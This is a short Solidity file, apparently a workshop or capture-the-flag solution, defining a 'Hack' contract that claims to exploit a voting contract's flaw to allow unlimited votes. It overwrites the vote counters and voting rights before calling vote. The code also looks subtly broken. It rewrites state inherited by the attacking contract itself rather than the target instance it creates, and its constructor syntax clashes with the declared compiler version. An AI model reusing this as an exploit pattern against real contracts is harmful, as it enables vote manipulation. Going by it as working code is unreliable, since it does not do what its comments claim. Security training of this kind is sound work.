// SPDX-License-Identifier: MIT
pragma solidity ^0.4.10;
import "../contracts/SolidityHackingWorkshop.sol";

/*
* @title: HSC.
* @author: Anthony (fps) https://github.com/fps8k .
* @dev: 
*/

/*
* @dev:
*
* Vulnerabilities observed:
* - Exploitable public variables.
* - Exploitable voting code where infinite voting is possible.
*/

contract Hack is VoteTwoChoices
{
    VoteTwoChoices _vote_two_choices = new VoteTwoChoices();
    address owner;

    constructor()
    {
        owner = msg.sender;
    }

    modifier onlyowner()
    {
        require(msg.sender == owner, "!Owner");
        _;
    }



    
    /*
    * @dev:
    *
    * Conducts an illegal vote, giving the voter, infinite opportunities for votind
    */

    function exploitVoting(uint _number_of_votes, bytes32 ind) public
    {
        votesCast[msg.sender] = 0;
        votingRights[msg.sender] = _number_of_votes + 1;

        vote(_number_of_votes, ind);
    }
}